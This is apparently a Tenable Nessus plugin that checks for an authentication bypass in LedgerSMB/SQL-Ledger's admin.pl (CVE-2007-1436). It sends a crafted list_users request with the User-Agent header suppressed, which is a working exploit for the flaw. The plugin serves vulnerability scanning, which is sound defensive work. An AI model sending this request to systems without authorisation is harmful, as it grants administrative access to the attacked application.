#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(24784);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2007-1436");
  script_bugtraq_id(22889);
  script_xref(name:"OSVDB", value:"33622");
  script_xref(name:"OSVDB", value:"33623");

  script_name(english:"LedgerSMB / SQL-Ledger admin.pl Admin Authentication Bypass");
  script_summary(english:"Tries to bypass authentication in LedgerSMB/SQL-Ledger");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Perl application that is prone to an
authentication bypass attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running LedgerSMB or SQL-Ledger, a web-based
double-entry accounting system. 

The version of LedgerSMB or SQL-Ledger on the remote host contains a
design flaw that can be leveraged by a remote attacker to bypass
authentication and gain administrative access of the application." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2007-03/0086.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?836a2146" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?32a9e60d" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to LedgerSMB 1.1.9 / SQL-Ledger 2.6.26 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);


if (thorough_tests) dirs = list_uniq(make_list("/ledger", "/sql-ledger", "/ledger-smb", "/ledgersmb", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Bypass authentication and list users.
  req = http_get(
    item:string(
      dir, "/admin.pl?",
      "path=bin/mozilla&",
      "action=list_users"
    ), 
    port:port
  );
  # nb: exploit requires that there not be a User-Agent header.
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "X-User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # There's a problem if it looks like we got the list of users.
  #
  # nb: this won't necessarily work if the language is not English.
  if (
    "Database Administration" >< res && 
    (
      # SQL-Ledger
      'name=action value="Logout"' >< res ||
      # LedgerSMB
      'name="action" value="Logout"' >< res
    )
  )
  {
    security_hole(port);
    exit(0);
  }
}
